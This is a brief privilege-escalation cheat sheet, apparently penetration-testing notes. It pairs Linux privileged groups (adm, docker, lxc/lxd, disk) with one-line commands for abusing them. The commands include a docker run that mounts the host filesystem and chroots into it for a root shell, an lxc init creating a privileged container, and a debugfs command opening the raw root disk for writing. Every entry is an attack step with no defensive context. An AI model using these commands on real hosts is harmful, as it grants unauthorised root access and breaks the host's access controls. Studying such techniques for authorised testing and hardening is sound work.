# Privileged Groups
- **ADM Group**: `ls -la /var/log/`
- **Docker Group**: `docker run -v /:/mnt -it ubuntu chroot /mnt`
- **LXC/LXD**: `lxc init temp r00t -c security.privileged=true`
- **Disk Group**: `debugfs -w /dev/sda1`